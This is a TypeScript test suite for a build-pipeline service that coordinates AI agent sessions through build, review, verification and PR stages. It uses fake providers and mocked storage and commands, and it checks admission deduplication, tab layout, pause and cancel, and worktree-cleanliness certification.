import { describe, expect, mock, test } from "bun:test";
import { promises as fs } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import type { OpencodeClient } from "@opencode-ai/sdk/v2/client";
import type {
  BuildPipeline,
  PendingPipelineInteractionResolution,
  PipelineSession,
  PipelineSessionPhase,
} from "@orkestrator/protocol/build-pipeline";
import {
  isBuildPipeline,
  VERIFICATION_VERDICT_SCHEMA,
} from "@orkestrator/protocol/build-pipeline";
import {
  AGENT_INTERACTION_CONTRACT_VERSION,
  AGENT_INTERACTION_CLAIM_RETENTION_MS,
  AGENT_INTERACTION_JOURNAL_VERSION,
  AGENT_INTERACTION_LIMITS,
  AGENT_INTERACTION_SUMMARY_VERSION,
  UNATTENDED_AGENT_INTERACTION_POLICY,
  type AgentInteractionRequest,
} from "@orkestrator/protocol/agent-interactions";
import {
  STRUCTURED_REVIEW_REPORT_JSON_SCHEMA,
  type StructuredReviewReport,
} from "@orkestrator/protocol/structured-review";
import type {
  JsonSchema,
  StructuredOutputResult,
} from "@orkestrator/protocol/structured-output";
import { StorageService } from "./storage.js";
import {
  BuildPipelineService,
} from "./build-pipeline-service.js";
import { ProviderUnavailableError } from "./build-pipeline-provider.js";
import type {
  BuildPipelineProvider,
  ProviderCreateSessionOptions,
  ProviderSessionRegistration,
  ProviderStatus,
} from "./build-pipeline-provider.js";

const cleanReview: StructuredReviewReport = {
  reviewScope: {
    targetBranch: "main",
    baseRef: "base",
    commit: { sha: "head", subject: "feat: build" },
    filesReviewed: ["src/app.ts"],
    filesSkipped: [],
    filesLeftUncommitted: [],
    commandsRun: [{ command: "bun test", result: "passed", summary: "Passed" }],
    commandsNotRun: [],
    limitations: [],
  },
  whatChanged: {
    overview: "Implemented the task.",
    before: "Missing.",
    after: "Present.",
    keyCodeChanges: [{
      file: "src/app.ts",
      line: 1,
      description: "Adds the feature.",
    }],
    userImpact: "The feature is available.",
  },
  riskProfile: {
    changeTypes: ["feature"],
    riskAreas: [],
    overallRisk: "low",
    reasoning: "Small change.",
  },
  testResults: {
    total: 1,
    passed: 1,
    failed: 0,
    notRun: 0,
    failures: [],
  },
  strengths: [],
  issues: [],
  testCoverageGaps: [],
  verdict: { ready: "yes", reasoning: "Ready." },
  summaryOfChange: "Implemented the task.",
  reviewSummary: "No findings.",
};

class FakeProvider implements BuildPipelineProvider {
  readonly agent = "claude" as const;
  readonly phases = new Map<string, PipelineSessionPhase>();
  readonly sent: Array<{
    sessionId: string;
    requestId: string;
    prompt: string;
    schema?: JsonSchema;
    mode?: "plan" | "build";
  }> = [];
  readonly created: Array<{
    phase: PipelineSessionPhase;
    label: string;
    options?: ProviderCreateSessionOptions;
  }> = [];
  readonly registered: Array<{
    sessionId: string;
    interaction?: ProviderSessionRegistration;
  }> = [];
  private counter = 0;

  registerSession(
    sessionId: string,
    interaction?: ProviderSessionRegistration,
  ): void {
    this.registered.push({ sessionId, interaction });
  }

  async createSession(
    phase: PipelineSessionPhase,
    label: string,
    options?: ProviderCreateSessionOptions,
  ): Promise<string> {
    this.created.push({ phase, label, options });
    const id = `${phase}-${++this.counter}`;
    this.phases.set(id, phase);
    return id;
  }

  async send(
    sessionId: string,
    prompt: string,
    options: { requestId: string; schema?: JsonSchema; mode?: "plan" | "build" },
  ): Promise<void> {
    this.sent.push({
      sessionId,
      requestId: options.requestId,
      prompt,
      schema: options.schema,
      mode: options.mode,
    });
  }

  async status(_sessionId: string): Promise<ProviderStatus> {
    return "idle";
  }

  async messages(sessionId: string): Promise<unknown[]> {
    return [{
      id: `${sessionId}-assistant`,
      role: "assistant",
      parts: [{ type: "text", content: "Finished" }],
    }];
  }

  async structured<T>(
    sessionId: string,
    requestId: string,
  ): Promise<StructuredOutputResult<T>> {
    const phase = this.phases.get(sessionId);
    return {
      ok: true,
      provider: "claude",
      requestId,
      value: (phase === "review"
        ? cleanReview
        : { complete: true, rationale: "All criteria pass." }) as T,
    };
  }

  async abort(_sessionId: string): Promise<void> {}
}

async function withService(
  run: (
    service: BuildPipelineService,
    storage: StorageService,
    provider: FakeProvider,
    invocations: Array<{ command: string; args: Record<string, unknown> }>,
    controls: {
      dataDir: string;
      detection: {
        url: string;
        state: "open" | "merged" | "closed";
        hasMergeConflicts: boolean | null;
      } | null;
      failCommands: Set<string>;
      failCommandsOnce: Map<string, number>;
      currentHead: string;
      uncommittedPaths: string[];
      kanbanTasks: Map<string, {
        id: string;
        status: string;
        prUrl?: string;
        prState?: string;
        comments: Array<{ text: string }>;
      }>;
    },
  ) => Promise<void>,
): Promise<void> {
  const dataDir = await fs.mkdtemp(path.join(tmpdir(), "orkestrator-pipeline-runner-"));
  const storage = new StorageService(dataDir);
  await storage.init();
  await storage.addEnvironment({
    id: "env-1",
    projectId: "project-1",
    name: "build",
    branch: "build",
    containerId: null,
    status: "running",
    prUrl: null,
    prState: null,
    hasMergeConflicts: null,
    createdAt: new Date(0).toISOString(),
    networkAccessMode: "full",
    order: 0,
    environmentType: "local",
    worktreePath: "/tmp/build",
    setupScriptsComplete: true,
  });
  const provider = new FakeProvider();
  const invocations: Array<{
    command: string;
    args: Record<string, unknown>;
  }> = [];
  const kanbanTasks = new Map<string, {
    id: string;
    status: string;
    prUrl?: string;
    prState?: string;
    comments: Array<{ text: string }>;
  }>();
  const controls = {
    dataDir,
    detection: {
      url: "https://github.com/acme/repo/pull/1",
      state: "open" as const,
      hasMergeConflicts: false,
    } as {
      url: string;
      state: "open" | "merged" | "closed";
      hasMergeConflicts: boolean | null;
    } | null,
    failCommands: new Set<string>(),
    // Counts down a command's remaining transient failures, so a test can make
    // a probe fail once and then succeed rather than only fail forever.
    failCommandsOnce: new Map<string, number>(),
    currentHead: "1111111111111111111111111111111111111111",
    uncommittedPaths: [] as string[],
    kanbanTasks,
  };
  const invoke = async <T>(
    command: string,
    args: Record<string, unknown> = {},
  ): Promise<T> => {
    invocations.push({ command, args });
    if (controls.failCommands.has(command)) {
      throw new Error(`${command} failed`);
    }
    const transient = controls.failCommandsOnce.get(command) ?? 0;
    if (transient > 0) {
      controls.failCommandsOnce.set(command, transient - 1);
      throw new Error(`${command} failed transiently`);
    }
    if (command === "detect_pr_local" || command === "detect_pr") {
      return controls.detection as T;
    }
    if (command === "get_environment_uncommitted_paths") {
      return {
        head: controls.currentHead,
        paths: [...controls.uncommittedPaths],
      } as T;
    }
    if (command === "start_environment" || command === "run_environment_setup") {
      return (await storage.getEnvironment("env-1")) as T;
    }
    if (command === "update_environment_agent_settings") {
      return (await storage.getEnvironment("env-1")) as T;
    }
    if (command === "get_kanban_tasks") {
      return [...kanbanTasks.values()] as T;
    }
    if (command === "update_kanban_task") {
      const taskId = String(args.taskId);
      const task = kanbanTasks.get(taskId) ?? {
        id: taskId,
        status: "backlog",
        comments: [],
      };
      Object.assign(task, args);
      kanbanTasks.set(taskId, task);
      return task as T;
    }
    if (command === "add_kanban_comment") {
      const taskId = String(args.taskId);
      const task = kanbanTasks.get(taskId) ?? {
        id: taskId,
        status: "backlog",
        comments: [],
      };
      task.comments.push({ text: String(args.text) });
      kanbanTasks.set(taskId, task);
      return undefined as T;
    }
    if (command === "update_feature_plan") return undefined as T;
    if (command === "pr_monitor_watch") return undefined as T;
    if (
      command === "post_linear_completion_comment"
      || command === "post_github_completion_comment"
    ) {
      return {
        commentId: "comment-1",
        postedAt: new Date(1).toISOString(),
      } as T;
    }
    throw new Error(`Unexpected command: ${command}`);
  };
  const service = new BuildPipelineService(storage, invoke, {
    autoAdvance: false,
    provider: async () => provider,
  });
  try {
    await run(service, storage, provider, invocations, controls);
  } finally {
    await service.shutdown();
    await fs.rm(dataDir, { recursive: true, force: true });
  }
}

async function pipeline(
  storage: StorageService,
  id: string,
): Promise<BuildPipeline> {
  const stored = await storage.getBuildPipeline(id);
  if (!stored) throw new Error("Pipeline disappeared");
  return stored.snapshot as BuildPipeline;
}

function startInput(
  overrides: Partial<Parameters<BuildPipelineService["start"]>[0]> = {},
): Parameters<BuildPipelineService["start"]>[0] {
  return {
    taskId: "task-default",
    projectId: "project-1",
    environmentType: "local",
    agentType: "claude",
    taskTitle: "Backend pipeline",
    taskSnapshot: {
      title: "Backend pipeline",
      description: "Move the runner",
      acceptanceCriteria: "No renderer orchestration",
      comments: [],
      images: [],
    },
    existingEnvironmentId: "env-1",
    ...overrides,
  };
}

function pendingQuestion(
  sessionId: string,
  id = "question-1",
): AgentInteractionRequest {
  const now = Date.now();
  return {
    version: AGENT_INTERACTION_CONTRACT_VERSION,
    id,
    provider: "claude",
    kind: "question",
    origin: "build-pipeline",
    sessionId,
    state: "pending",
    revision: 1,
    presentation: {
      title: "Choose a safe implementation",
      questions: [],
    },
    createdAt: now,
    updatedAt: now,
  };
}

type ProviderInteractions = NonNullable<BuildPipelineProvider["interactions"]>;

/** The cast every interaction test needs to bolt a capability onto the fake. */
function installInteractions(
  provider: FakeProvider,
  interactions: ProviderInteractions,
): void {
  (provider as unknown as { interactions: ProviderInteractions })
    .interactions = interactions;
}

/** Runs the two provisioning passes and returns the live build session. */
async function startBuilding(
  service: BuildPipelineService,
  storage: StorageService,
  overrides: Partial<Parameters<BuildPipelineService["start"]>[0]> = {},
): Promise<{ started: BuildPipeline; session: PipelineSession }> {
  const started = await service.start(startInput(overrides));
  await service.advanceNow(started.id);
  await service.advanceNow(started.id);
  const running = await pipeline(storage, started.id);
  expect(running.phase).toBe("building");
  return { started, session: running.sessions[running.currentSessionIndex]! };
}

/** Writes durable state the way another process would, outside the service. */
async function mutateStored(
  storage: StorageService,
  pipelineId: string,
  mutation: (snapshot: BuildPipeline) => void,
): Promise<BuildPipeline> {
  const record = await storage.getBuildPipeline(pipelineId);
  if (!record) throw new Error("Pipeline disappeared");
  const snapshot = record.snapshot as BuildPipeline;
  mutation(snapshot);
  await storage.saveBuildPipeline(
    snapshot.id,
    snapshot.projectId,
    snapshot.environmentId,
    record.version,
    snapshot,
    record.revision,
  );
  return snapshot;
}

function pendingEnvelope(
  session: PipelineSession,
  request: AgentInteractionRequest,
  journalId: string,
  claimedAt: number,
  action: PendingPipelineInteractionResolution["action"] = "decline-and-continue",
): PendingPipelineInteractionResolution {
  return {
    journalId,
    sessionKey: session.sessionKey,
    sessionId: session.sdkSessionId,
    interactionId: request.id,
    provider: request.provider,
    kind: request.kind,
    phase: session.phase,
    requestedAt: Math.min(request.createdAt, claimedAt),
    claimedAt,
    action,
    title: request.presentation.title,
    questions: [],
  };
}

async function startVerifying(
  service: BuildPipelineService,
  storage: StorageService,
): Promise<BuildPipeline> {
  const started = await service.start(startInput());
  for (let pass = 0; pass < 4; pass += 1) {
    await service.advanceNow(started.id);
  }
  const verifying = await pipeline(storage, started.id);
  expect(verifying.phase).toBe("verifying");
  return verifying;
}

describe("BuildPipelineService", () => {
  test("rejects malformed starts and environments already being deleted", async () => {
    await withService(async (service, storage) => {
      await expect(service.start({} as never)).rejects.toThrow(
        "Invalid build pipeline start request",
      );

      await storage.updateEnvironment("env-1", {
        deletionRequestedAt: new Date().toISOString(),
      });
      await expect(service.start(startInput())).rejects.toThrow(
        "does not belong to this project",
      );
      expect(await storage.listBuildPipelines("project-1")).toEqual([]);
    });
  });

  test("admits one equivalent start across two backend processes", async () => {
    const dataDir = await fs.mkdtemp(path.join(tmpdir(), "orkestrator-pipeline-admission-"));
    const firstStorage = new StorageService(dataDir);
    const secondStorage = new StorageService(dataDir);
    await Promise.all([firstStorage.init(), secondStorage.init()]);
    await firstStorage.addEnvironment({
      id: "env-1",
      projectId: "project-1",
      name: "build",
      branch: "build",
      containerId: null,
      status: "running",
      prUrl: null,
      prState: null,
      hasMergeConflicts: null,
      createdAt: new Date(0).toISOString(),
      networkAccessMode: "full",
      order: 0,
      environmentType: "local",
      worktreePath: "/tmp/build",
      setupScriptsComplete: true,
    });
    const invoke = async <T>(): Promise<T> => {
      throw new Error("No backend command should run during admission");
    };
    const first = new BuildPipelineService(firstStorage, invoke, {
      autoAdvance: false,
      provider: async () => new FakeProvider(),
    });
    const second = new BuildPipelineService(secondStorage, invoke, {
      autoAdvance: false,
      provider: async () => new FakeProvider(),
    });
    try {
      const [left, right] = await Promise.all([
        first.start(startInput()),
        second.start(startInput()),
      ]);
      expect(right.id).toBe(left.id);
      expect(await firstStorage.listBuildPipelines("project-1")).toHaveLength(1);
    } finally {
      await Promise.all([first.shutdown(), second.shutdown()]);
      await fs.rm(dataDir, { recursive: true, force: true });
    }
  });

  test("repairs build-tab publication when an admitted start is retried", async () => {
    await withService(async (service, storage) => {
      const ensureBuildPipelineTab = storage.ensureBuildPipelineTab.bind(storage);
      let attempts = 0;
      storage.ensureBuildPipelineTab = mock(async (input) => {
        attempts += 1;
        if (attempts === 1) throw new Error("pane layout temporarily unavailable");
        return ensureBuildPipelineTab(input);
      });

      const input = startInput();
      await expect(service.start(input)).rejects.toThrow(
        "pane layout temporarily unavailable",
      );

      const [persisted] = await storage.listBuildPipelines(input.projectId);
      expect(persisted).toBeDefined();
      expect(persisted!.snapshot).toMatchObject({
        id: persisted!.id,
        environmentId: "env-1",
        sourceLinkedAt: expect.any(String),
      });
      expect(await storage.getPaneLayout("env-1")).toBeNull();

      const retried = await service.start(input);
      expect(retried.id).toBe(persisted!.id);
      expect(attempts).toBe(2);
      expect(await storage.getPaneLayout("env-1")).toMatchObject({
        root: {
          kind: "leaf",
          activeTabId: `build-${persisted!.id}`,
          tabs: [{
            id: `build-${persisted!.id}`,
            type: "claude-build",
            buildTabData: {
              pipelineId: persisted!.id,
              taskId: input.taskId,
            },
          }],
        },
      });
    });
  });

  test("selects the build tab when setup hands off to the build stage", async () => {
    await withService(async (service, storage) => {
      const started = await service.start(startInput());
      await service.advanceNow(started.id);
      expect((await pipeline(storage, started.id)).phase).toBe("waiting-for-setup");

      const buildLayout = await storage.getPaneLayout("env-1");
      const buildRoot = buildLayout?.root as {
        kind?: unknown;
        id?: unknown;
        tabs?: unknown;
        activeTabId?: unknown;
      } | undefined;
      if (
        !buildLayout
        || buildRoot?.kind !== "leaf"
        || typeof buildRoot.id !== "string"
        || !Array.isArray(buildRoot.tabs)
      ) {
        throw new Error("expected a leaf build layout");
      }
      await storage.savePaneLayout("env-1", {
        version: buildLayout.version,
        containerId: buildLayout.containerId,
        activePaneId: buildLayout.activePaneId,
        root: {
          ...buildRoot,
          tabs: [
            ...buildRoot.tabs,
            { id: "setup-terminal", type: "plain", isSetupTab: true },
          ],
          activeTabId: "setup-terminal",
        },
      }, buildLayout.revision);
      expect((await storage.getPaneLayout("env-1"))?.root).toMatchObject({
        activeTabId: "setup-terminal",
      });

      await service.advanceNow(started.id);

      expect((await pipeline(storage, started.id)).phase).toBe("building");
      expect((await storage.getPaneLayout("env-1"))?.root).toMatchObject({
        activeTabId: `build-${started.id}`,
      });
    });
  });

  test("canonicalizes immutable admission identity and ignores mutable source metadata", async () => {
    const dataDir = await fs.mkdtemp(path.join(tmpdir(), "orkestrator-pipeline-canonical-"));
    const firstStorage = new StorageService(dataDir);
    const secondStorage = new StorageService(dataDir);
    await Promise.all([firstStorage.init(), secondStorage.init()]);
    await firstStorage.addEnvironment({
      id: "env-1",
      projectId: "project-1",
      name: "build",
      branch: "build",
      containerId: null,
      status: "running",
      prUrl: null,
      prState: null,
      hasMergeConflicts: null,
      createdAt: new Date(0).toISOString(),
      networkAccessMode: "full",
      order: 0,
      environmentType: "local",
      worktreePath: "/tmp/build",
      setupScriptsComplete: true,
    });
    const invoke = async <T>(): Promise<T> => undefined as T;
    const first = new BuildPipelineService(firstStorage, invoke, {
      autoAdvance: false,
      provider: async () => new FakeProvider(),
    });
    const second = new BuildPipelineService(secondStorage, invoke, {
      autoAdvance: false,
      provider: async () => new FakeProvider(),
    });
    try {
      const firstInput = startInput({
        existingEnvironmentId: " env-1 ",
        featurePlanId: " feature-1 ",
        source: {
          type: "linear",
          issueId: "issue-1",
          issueIdentifier: "OLD-1",
          issueUrl: "https://linear.example/old",
          status: "backlog",
          teamKey: "OLD",
          updatedAt: "2026-01-01T00:00:00.000Z",
        },
      });
      const secondInput = startInput({
        existingEnvironmentId: "env-1",
        featurePlanId: "feature-1",
        source: {
          type: "linear",
          issueId: "issue-1",
          issueIdentifier: "NEW-99",
          issueUrl: "https://linear.example/new",
          status: "started",
          teamKey: "NEW",
          updatedAt: "2026-07-29T00:00:00.000Z",
        },
      });

      const [left, right] = await Promise.all([
        first.start(firstInput),
        second.start(secondInput),
      ]);

      expect(right.id).toBe(left.id);
      expect(await firstStorage.listBuildPipelines("project-1")).toHaveLength(1);
    } finally {
      await Promise.all([first.shutdown(), second.shutdown()]);
      await fs.rm(dataDir, { recursive: true, force: true });
    }
  });

  test("keeps distinct immutable admission identities separate", async () => {
    const dataDir = await fs.mkdtemp(path.join(tmpdir(), "orkestrator-pipeline-distinct-"));
    const storage = new StorageService(dataDir);
    await storage.init();
    for (const id of ["env-1", "env-2"]) {
      await storage.addEnvironment({
        id,
        projectId: "project-1",
        name: id,
        branch: id,
        containerId: null,
        status: "running",
        prUrl: null,
        prState: null,
        hasMergeConflicts: null,
        createdAt: new Date(0).toISOString(),
        networkAccessMode: "full",
        order: id === "env-1" ? 0 : 1,
        environmentType: "local",
        worktreePath: `/tmp/${id}`,
        setupScriptsComplete: true,
      });
    }
    const service = new BuildPipelineService(
      storage,
      async <T>(): Promise<T> => undefined as T,
      {
        autoAdvance: false,
        provider: async () => new FakeProvider(),
      },
    );
    try {
      const source = {
        type: "linear" as const,
        issueId: "issue-1",
        issueIdentifier: "TEAM-1",
      };
      const starts = [
        startInput({ taskId: "task-1", source }),
        startInput({ taskId: "task-2", source }),
        startInput({
          taskId: "task-1",
          source: { ...source, issueId: "issue-2" },
        }),
        startInput({
          taskId: "task-1",
          source,
          existingEnvironmentId: "env-2",
        }),
        startInput({
          taskId: "task-1",
          source,
          featurePlanId: "feature-2",
        }),
      ];
      const results = [];
      for (const input of starts) results.push(await service.start(input));

      expect(new Set(results.map(({ id }) => id)).size).toBe(starts.length);
      expect(await storage.listBuildPipelines("project-1")).toHaveLength(
        starts.length,
      );
    } finally {
      await service.shutdown();
      await fs.rm(dataDir, { recursive: true, force: true });
    }
  });

  test("admits one concurrent new-environment start and preserves its naming prompt", async () => {
    const dataDir = await fs.mkdtemp(path.join(tmpdir(), "orkestrator-pipeline-new-env-"));
    const firstStorage = new StorageService(dataDir);
    const secondStorage = new StorageService(dataDir);
    await Promise.all([firstStorage.init(), secondStorage.init()]);
    const createEnvironment = mock(async (args: Record<string, unknown>) => {
      const environment = {
        id: "env-created",
        projectId: "project-1",
        name: "created",
        branch: "created",
        containerId: null,
        status: "running" as const,
        prUrl: null,
        prState: null,
        hasMergeConflicts: null,
        createdAt: new Date(0).toISOString(),
        networkAccessMode: "full" as const,
        order: 0,
        environmentType: "local" as const,
        worktreePath: "/tmp/env-created",
        setupScriptsComplete: true,
      };
      await firstStorage.addEnvironment(environment);
      expect(args.namingPrompt).toBe("name this durable build");
      return environment;
    });
    const invoke = async <T>(
      command: string,
      args: Record<string, unknown> = {},
    ): Promise<T> => {
      if (command === "create_environment") {
        return await createEnvironment(args) as T;
      }
      throw new Error(`Unexpected command: ${command}`);
    };
    const first = new BuildPipelineService(firstStorage, invoke, {
      autoAdvance: false,
      provider: async () => new FakeProvider(),
    });
    const second = new BuildPipelineService(secondStorage, invoke, {
      autoAdvance: false,
      provider: async () => new FakeProvider(),
    });
    try {
      const input = startInput({
        existingEnvironmentId: undefined,
        namingPrompt: "name this durable build",
      });
      const [left, right] = await Promise.all([
        first.start(input),
        second.start(input),
      ]);

      expect(right.id).toBe(left.id);
      expect(createEnvironment).toHaveBeenCalledTimes(1);
      expect(await firstStorage.listBuildPipelines("project-1")).toHaveLength(1);
    } finally {
      await Promise.all([first.shutdown(), second.shutdown()]);
      await fs.rm(dataDir, { recursive: true, force: true });
    }
  });

  test("rejects a malformed snapshot returned by admission", async () => {
    const dataDir = await fs.mkdtemp(path.join(tmpdir(), "orkestrator-pipeline-malformed-"));
    const storage = new StorageService(dataDir);
    await storage.init();
    await storage.addEnvironment({
      id: "env-1",
      projectId: "project-1",
      name: "build",
      branch: "build",
      containerId: null,
      status: "running",
      prUrl: null,
      prState: null,
      hasMergeConflicts: null,
      createdAt: new Date(0).toISOString(),
      networkAccessMode: "full",
      order: 0,
      environmentType: "local",
      worktreePath: "/tmp/build",
      setupScriptsComplete: true,
    });
    storage.saveBuildPipeline = mock(async (
      _pipelineId,
      projectId,
      environmentId,
      version,
    ) => ({
      version,
      id: "admitted-malformed",
      projectId,
      environmentId,
      snapshot: {},
      updatedAt: new Date().toISOString(),
      revision: 1,
    }));
    const service = new BuildPipelineService(
      storage,
      async <T>(): Promise<T> => undefined as T,
      {
        autoAdvance: false,
        provider: async () => new FakeProvider(),
      },
    );
    try {
      await expect(service.start(startInput())).rejects.toThrow(
        "Existing build pipeline admission is invalid",
      );
    } finally {
      await service.shutdown();
      await fs.rm(dataDir, { recursive: true, force: true });
    }
  });

  test("wires repository defaults, authentication and staged images into the production Codex provider", async () => {
    const dataDir = await fs.mkdtemp(
      path.join(tmpdir(), "orkestrator-pipeline-production-provider-"),
    );
    const storage = new StorageService(dataDir);
    await storage.init();
    await storage.addEnvironment({
      id: "env-1",
      projectId: "project-1",
      name: "build",
      branch: "build",
      containerId: null,
      status: "running",
      prUrl: null,
      prState: null,
      hasMergeConflicts: null,
      createdAt: new Date(0).toISOString(),
      networkAccessMode: "full",
      order: 0,
      environmentType: "local",
      worktreePath: "/tmp/build",
      setupScriptsComplete: true,
    });
    await storage.updateRepositoryConfig("project-1", {
      defaultBranch: "main",
      prBaseBranch: "main",
      defaultAgent: "codex",
      defaultModel: "repo-codex",
      defaultEffort: "xhigh",
    });

    const requests: Array<{ url: string; init: RequestInit }> = [];
    const originalFetch = globalThis.fetch;
    globalThis.fetch = mock(async (
      input: string | URL | Request,
      init: RequestInit = {},
    ) => {
      const url = String(input);
      requests.push({ url, init });
      if (url.endsWith("/session/create")) {
        return Response.json({ sessionId: "build-production-1" });
      }
      return new Response(null, { status: 204 });
    }) as unknown as typeof fetch;

    const invocations: Array<{
      command: string;
      args: Record<string, unknown>;
    }> = [];
    const service = new BuildPipelineService(
      storage,
      async <T>(
        command: string,
        args: Record<string, unknown> = {},
      ): Promise<T> => {
        invocations.push({ command, args });
        if (
          command === "update_environment_agent_settings"
          || command === "run_environment_setup"
        ) {
          return (await storage.getEnvironment("env-1")) as T;
        }
        if (command === "start_local_codex_server_cmd") {
          return { port: 3210, authToken: "test-auth-token" } as T;
        }
        if (command === "write_local_file") {
          return "/tmp/build/.orkestrator/prompt-attachments/shot.png" as T;
        }
        throw new Error(`Unexpected command: ${command}`);
      },
      { autoAdvance: false },
    );
    try {
      const started = await service.start(startInput({
        agentType: "codex",
        taskSnapshot: {
          ...startInput().taskSnapshot,
          images: [{ filename: "shot.png", data: "AAAA" }],
        },
      }));
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);

      expect(invocations).toContainEqual({
        command: "start_local_codex_server_cmd",
        args: { environmentId: "env-1" },
      });
      expect(invocations).toContainEqual({
        command: "write_local_file",
        args: {
          worktreePath: "/tmp/build",
          filePath: ".orkestrator/prompt-attachments/shot.png",
          base64Data: "AAAA",
        },
      });
      expect(requests.map(({ url }) => url)).toEqual([
        "http://127.0.0.1:3210/session/create",
        "http://127.0.0.1:3210/session/build-production-1/prompt",
      ]);
      const create = requests[0]!;
      expect(new Headers(create.init.headers).get("X-Orkestrator-Codex-Token"))
        .toBe("test-auth-token");
      expect(JSON.parse(String(create.init.body))).toMatchObject({
        model: "repo-codex",
        modelReasoningEffort: "xhigh",
        mode: "build",
      });
      expect(JSON.parse(String(requests[1]!.init.body))).toMatchObject({
        attachments: [{
          type: "image",
          path: "/tmp/build/.orkestrator/prompt-attachments/shot.png",
          filename: "shot.png",
          dataUrl: "data:image/png;base64,AAAA",
        }],
      });
    } finally {
      await service.shutdown();
      globalThis.fetch = originalFetch;
      await fs.rm(dataDir, { recursive: true, force: true });
    }
  });

  test("owns and advances the complete pipeline without a renderer", async () => {
    await withService(async (service, storage, provider) => {
      const started = await service.start({
        taskId: "task-1",
        projectId: "project-1",
        environmentType: "local",
        agentType: "claude",
        taskTitle: "Backend pipeline",
        taskSnapshot: {
          title: "Backend pipeline",
          description: "Move the runner",
          acceptanceCriteria: "No renderer orchestration",
          comments: [],
          images: [],
        },
        source: { type: "kanban", taskId: "task-1" },
        existingEnvironmentId: "env-1",
      });

      expect(started).toMatchObject({
        controller: "backend",
        phase: "starting-environment",
        environmentId: "env-1",
      });

      for (let pass = 0; pass < 6; pass += 1) {
        await service.advanceNow(started.id);
      }

      const completed = await pipeline(storage, started.id);
      expect(completed.phase).toBe("complete");
      expect(completed.sessions.map((session) => session.phase)).toEqual([
        "build",
        "review",
        "verify",
        "pr",
      ]);
      expect(completed.sessions.every((session) =>
        Array.isArray(session.messages))).toBe(true);
      expect(completed.sessions.map((session) => [
        session.phase,
        session.structuredResultStatus,
      ])).toEqual([
        ["build", undefined],
        ["review", "accepted"],
        ["verify", "accepted"],
        ["pr", undefined],
      ]);
      expect(provider.sent).toHaveLength(4);
      const verificationDispatch = provider.sent.find((entry) =>
        provider.phases.get(entry.sessionId) === "verify"
      );
      expect(verificationDispatch?.schema).toBe(VERIFICATION_VERDICT_SCHEMA);
      expect(completed.verificationResult).toBe("pass");
    });
  });

  test("pause and cancel are backend mutations and abort running work", async () => {
    await withService(async (service, storage, provider) => {
      let aborted = "";
      provider.abort = async (sessionId) => {
        aborted = sessionId;
      };
      const started = await service.start({
        taskId: "task-2",
        projectId: "project-1",
        environmentType: "local",
        agentType: "claude",
        taskTitle: "Control pipeline",
        taskSnapshot: {
          title: "Control pipeline",
          description: "",
          acceptanceCriteria: "",
          comments: [],
          images: [],
        },
        existingEnvironmentId: "env-1",
      });
      await service.advanceNow(started.id);
      await service.advanceNow(started.id);
      const running = await pipeline(storage, started.id);
      expect(running.phase).toBe("building");

      const paused = await service.pause(started.id);
      expect(paused.phase).toBe("paused");
      expect(aborted).toBe(running.sessions[0]?.sdkSessionId ?? "");

      const resumed = await service.resume(started.id);
      expect(resumed.phase).toBe("building");
      const cancelled = await service.cancel(started.id);
      expect(cancelled).toMatchObject({
        phase: "failed",
        error: "Build cancelled",
        controller: "backend",
      });
    });
  });

  // The build stage is only asked to commit. Without the backend's own probe a
  // review would re-derive the worktree state inside its turn and could quietly
  // decide it was dirty and skip validation altogether.
  test("tells the review stage the backend saw a clean worktree", async () => {
    await withService(async (service, storage, provider, invocations, controls) => {
      controls.uncommittedPaths = [];
      const { started } = await startBuilding(service, storage);
      await service.advanceNow(started.id);

      expect((await pipeline(storage, started.id)).phase).toBe("reviewing");
      expect(invocations).toContainEqual({
        command: "get_environment_uncommitted_paths",
        args: { environmentId: "env-1" },
      });
      const review = provider.sent.at(-1)!;
      expect(review.prompt).toContain(
        "the backend confirmed the environment worktree was clean when this review started",
      );
      expect((await pipeline(storage, started.id)).sessions.at(-1))
        .toMatchObject({ structuredResultStatus: "pending" });
    });
  });

  test("names the paths the build stage left uncommitted in the review prompt", async () => {
    await withService(async (service, storage, provider, _invocations, controls) => {
      controls.uncommittedPaths = ["src/forgotten.ts", "src/forgotten.test.ts"];
      const { started } = await startBuilding(service, storage);
      await service.advanceNow(started.id);

      const review = provider.sent.at(-1)!;
      expect(review.prompt).toContain(
        "the preceding build stage did not commit everything",
      );
      expect(review.prompt).toContain("- `src/forgotten.ts`");
      expect(review.prompt).toContain("- `src/forgotten.test.ts`");
    });
  });

  // The build stage is only asked to commit, so a review can legitimately open
  // on a dirty tree. Certification compares against that baseline rather than
  // against cleanliness, so the leftovers must not fail a review that passed.
  test("certifies a review that started on a dirty worktree it did not change", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      controls.uncommittedPaths = ["src/forgotten.ts", "src/forgotten.test.ts"];
      const { started } = await startBuilding(service, storage);
      await service.advanceNow(started.id);
      const reviewing = await pipeline(storage, started.id);
      expect(reviewing.phase).toBe("reviewing");
      expect(reviewing.sessions.at(-1)).toMatchObject({
        validationHeadAtStart: controls.currentHead,
        validationWorktreeStatusAtStart: "dirty",
        validationUncommittedPathsAtStart: ["src/forgotten.ts", "src/forgotten.test.ts"],
      });

      // Reported in a different order: the baseline is a set, not a sequence.
      controls.uncommittedPaths = ["src/forgotten.test.ts", "src/forgotten.ts"];
      await service.advanceNow(started.id);

      expect((await pipeline(storage, started.id)).phase).toBe("verifying");
    });
  });

  test("fails closed when validation adds a path to an already dirty worktree", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      controls.uncommittedPaths = ["src/forgotten.ts"];
      const { started } = await startBuilding(service, storage);
      await service.advanceNow(started.id);
      expect((await pipeline(storage, started.id)).phase).toBe("reviewing");

      controls.uncommittedPaths = ["src/forgotten.ts", "src/generated.ts"];
      await service.advanceNow(started.id);

      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        error: "Review cannot be certified because validation left 1 uncommitted path that was not there when it started",
      });
    });
  });

  // Deleting an uncommitted leftover destroys work no commit is holding, so it
  // is a violation in the same way adding one is.
  test("fails closed when validation removes an uncommitted path it started with", async () => {
    await withService(async (service, storage, _provider, _invocations, controls) => {
      controls.uncommittedPaths = ["src/forgotten.ts", "src/forgotten.test.ts"];
      const { started } = await startBuilding(service, storage);
      await service.advanceNow(started.id);
      expect((await pipeline(storage, started.id)).phase).toBe("reviewing");

      controls.uncommittedPaths = ["src/forgotten.ts"];
      await service.advanceNow(started.id);

      expect(await pipeline(storage, started.id)).toMatchObject({
        phase: "failed",
        error: "Review cannot be certified because validation removed 1 uncommitted path that was there when it started",
      });
    });
  });

